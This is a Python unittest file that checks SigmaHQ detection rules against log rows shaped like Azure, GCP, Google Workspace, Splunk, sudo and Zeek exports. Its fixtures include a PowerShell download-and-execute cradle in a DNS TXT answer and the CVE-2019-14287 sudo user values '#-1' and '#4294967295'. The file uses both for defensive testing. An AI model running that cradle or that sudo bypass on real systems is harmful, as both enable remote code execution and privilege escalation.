"""Rules whose log source we read but whose field names no real row carried (2026-10-21
field audit: 58 SigmaHQ rules, 1 critical / 16 high). Each export has the fact under
another name. Rule bodies are SigmaHQ's; rows are the exports' real shapes.
"""
import json
import os
import sys
import unittest

for _p in (os.path.dirname(os.path.abspath(__file__)),
           os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "modules/backend")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import _optional_deps  # noqa: F401,E402
from services.fusion import external_logs as X, sigma_eval as S  # noqa: E402


def r(title, logsource, detection, level="high"):
    return S.compile_rule({"title": title, "id": title, "level": level, "logsource": logsource,
                           "detection": detection})


PIM = r("PIM Approvals And Deny Elevation", {"product": "azure", "service": "auditlogs"},
        {"selection": {"properties.message": "Request Approved/Denied"}, "condition": "selection"})
REIDENTIFY = r("Google Cloud Re-identifies Sensitive Information", {"product": "gcp", "service": "gcp.audit"},
               {"selection": {"gcp.audit.method_name": "projects.content.reidentify"}, "condition": "selection"},
               "medium")
BREAKGLASS = r("Google Cloud Kubernetes Admission Controller Break Glass", {"product": "gcp", "service": "gcp.audit"},
               {"selection": {"data.protoPayload.resource.type": "k8s_cluster",
                              "data.protoPayload.logName": ["cloudaudit.googleapis.com/activity",
                                                            "cloudaudit.googleapis.com%2Factivity"],
                              "data.protoPayload.methodName": "io.k8s.core.v1.pods.create"},
                "keywords": ["image-policy.k8s.io/break-glass"], "condition": "selection and keywords"}, "medium")
GWS_ADMIN = r("Google Workspace User Granted Admin Privileges", {"product": "gcp", "service": "google_workspace.admin"},
              {"selection": {"eventService": "admin.googleapis.com",
                             "eventName": ["GRANT_DELEGATED_ADMIN_PRIVILEGES", "GRANT_ADMIN_PRIVILEGE"]},
               "condition": "selection"}, "medium")
GWS_MFA = r("Google Workspace MFA Disabled", {"product": "gcp", "service": "google_workspace.admin"},
            {"selection_base": {"eventService": "admin.googleapis.com",
                                "eventName": ["ENFORCE_STRONG_AUTHENTICATION", "ALLOW_STRONG_AUTHENTICATION"]},
             "selection_eventValue": {"new_value": "false"}, "condition": "all of selection*"}, "medium")
TRANSPORT = r("Failed MSExchange Transport Agent Installation", {"product": "windows", "service": "msexchange-management"},
              {"selection": {"EventID": 6, "Data|contains": "Install-TransportAgent"}, "condition": "selection"})
RULES = [PIM, REIDENTIFY, BREAKGLASS, GWS_ADMIN, GWS_MFA, TRANSPORT]


def titles(text):
    _fmt, rows, left = X.read(text)
    return sorted({h["title"] for row in rows for h in S.evaluate(X.sigma_event(row), RULES)})


class EntraAudit(unittest.TestCase):
    ROW = {"time": "2026-10-21T08:00:00Z", "resourceId": "/tenants/t1/providers/Microsoft.aadiam",
           "operationName": "Request Approved/Denied", "category": "AuditLogs", "resultType": "",
           "properties": {"id": "PIM_1", "category": "RoleManagement", "result": "success",
                          "activityDisplayName": "Request Approved/Denied", "loggedByService": "PIM",
                          "initiatedBy": {"user": {"userPrincipalName": "admin@corp.example"}}}}

    def test_the_activity_name_is_properties_message(self):
        self.assertEqual(["PIM Approvals And Deny Elevation"], titles(json.dumps(self.ROW)))
        other = {**self.ROW, "operationName": "Add user",
                 "properties": {**self.ROW["properties"], "activityDisplayName": "Add user"}}
        self.assertEqual([], titles(json.dumps(other)))


class GcpAudit(unittest.TestCase):
    def row(self, method, log="cloudaudit.googleapis.com%2Factivity", rtype="dlp_project", extra=None):
        return {"insertId": "x", "logName": f"projects/p1/logs/{log}", "receiveTimestamp": "2026-10-21T08:00:00Z",
                "resource": {"type": rtype, "labels": {"project_id": "p1"}}, "timestamp": "2026-10-21T08:00:00Z",
                "protoPayload": {"@type": "type.googleapis.com/google.cloud.audit.AuditLog", "methodName": method,
                                 "serviceName": "dlp.googleapis.com",
                                 "authenticationInfo": {"principalEmail": "x@corp.example"}, **(extra or {})}}

    def test_method_name_under_elastics_name(self):
        self.assertEqual(["Google Cloud Re-identifies Sensitive Information"],
                         titles(json.dumps(self.row("projects.content.reidentify"))))
        self.assertEqual([], titles(json.dumps(self.row("projects.content.inspect"))))

    def test_the_pubsub_wrapping_names(self):
        # data.protoPayload.x -> protoPayload.x, else the top-level x (logName, resource.type).
        # (The rule's keyword is an annotation KEY; keywords read values only -- not changed.)
        _f, rows, _l = X.read(json.dumps(self.row("io.k8s.core.v1.pods.create", rtype="k8s_cluster")))
        ev = S.Event(X.sigma_event(rows[0]))
        self.assertEqual(("k8s_cluster", "projects/p1/logs/cloudaudit.googleapis.com%2Factivity",
                          "io.k8s.core.v1.pods.create"),
                         (ev.get("data.protoPayload.resource.type"), ev.get("data.protoPayload.logName"),
                          ev.get("data.protoPayload.methodName")))


class WorkspaceAdmin(unittest.TestCase):
    def row(self, name, params):
        return {"kind": "admin#reports#activity",
                "id": {"time": "2026-10-21T08:00:00Z", "applicationName": "admin", "customerId": "c"},
                "actor": {"email": "evil@corp.example"}, "ipAddress": "203.0.113.9",
                "events": [{"type": "x", "name": name, "parameters": params}]}

    def test_admin_rules_read_the_reports_api(self):
        self.assertEqual(["Google Workspace User Granted Admin Privileges"], titles(json.dumps(
            self.row("GRANT_ADMIN_PRIVILEGE", [{"name": "USER_EMAIL", "value": "bob@corp.example"}]))))
        self.assertEqual(["Google Workspace MFA Disabled"], titles(json.dumps(
            self.row("ENFORCE_STRONG_AUTHENTICATION", [{"name": "NEW_VALUE", "value": "false"}]))))
        self.assertEqual([], titles(json.dumps(
            self.row("ENFORCE_STRONG_AUTHENTICATION", [{"name": "NEW_VALUE", "value": "true"}]))))


class SplunkWindowsText(unittest.TestCase):
    TEXT = """11/21/2022 08:08:51 PM
LogName=MSExchange Management
EventCode=6
SourceName=MSExchange CmdletLogs
ComputerName=exch01.corp.local
Message=Cmdlet failed. Cmdlet Install-TransportAgent, parameters -Name "x" -TransportAgentFactory "a.b" -AssemblyPath "C:\\\\x.dll".
"""

    def test_event_id_and_data_from_eventcode_and_message(self):
        self.assertEqual(["Failed MSExchange Transport Agent Installation"], titles(self.TEXT))
        self.assertEqual([], titles(self.TEXT.replace("EventCode=6", "EventCode=1")))



SUDO = r("Sudo Privilege Escalation CVE-2019-14287 - Builtin", {"product": "linux", "service": "sudo"},
         {"selection_user": {"USER": ["#-*", "#*4294967295"]}, "condition": "selection_user"}, "critical")
TXT = r("DNS TXT Answer with Possible Execution Strings", {"category": "dns"},
        {"selection": {"record_type": "TXT", "answer|contains": ["IEX", "Invoke-Expression", "cmd.exe"]},
         "condition": "selection"})


class SudoLine(unittest.TestCase):
    LINE = "Oct 21 08:00:05 web1 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER={u} ; COMMAND=/bin/bash"

    def fired(self, text):
        _fmt, rows, left = X.read(text)
        rows = [X.sigma_event(r) for r in rows] or [X.sigma_event(r["raw"]) for r in X.indicator_rows(left or
                                                                                                   text.splitlines())]
        return [h["title"] for ev in rows for h in S.evaluate(ev, [SUDO])]

    def test_user_minus_one_in_a_mixed_auth_log(self):
        text = ("Oct 21 08:00:01 web1 sshd[812]: Accepted publickey for alice from 10.0.0.5 port 51234 ssh2\n"
                + self.LINE.format(u="#-1") + "\n" + self.LINE.format(u="root") + "\n")
        self.assertEqual(["Sudo Privilege Escalation CVE-2019-14287 - Builtin"], self.fired(text))

    def test_a_file_of_sudo_lines_only(self):
        self.assertEqual(1, len(self.fired(self.LINE.format(u="#4294967295"))))
        self.assertEqual([], self.fired(self.LINE.format(u="root")))


class DnsAnswers(unittest.TestCase):
    def zeek(self, qtype, answers):
        return {"_path": "dns", "ts": "2026-10-21T08:00:00Z", "uid": "C1", "id.orig_h": "10.0.0.5",
                "id.orig_p": 50000, "id.resp_h": "198.51.100.53", "id.resp_p": 53, "proto": "udp",
                "query": "x.evil.example", "qtype_name": qtype, "rcode_name": "NOERROR", "answers": answers}

    def test_zeek_txt_answer_with_a_command(self):
        rows = [X.sigma_event(self.zeek("TXT", ["IEX(New-Object Net.WebClient).DownloadString('http://x')"]))]
        self.assertEqual(["DNS TXT Answer with Possible Execution Strings"],
                         [h["title"] for ev in rows for h in S.evaluate(ev, [TXT])])
        self.assertEqual([], S.evaluate(X.sigma_event(self.zeek("A", ["IEX.example"])), [TXT]))


if __name__ == "__main__":
    unittest.main()
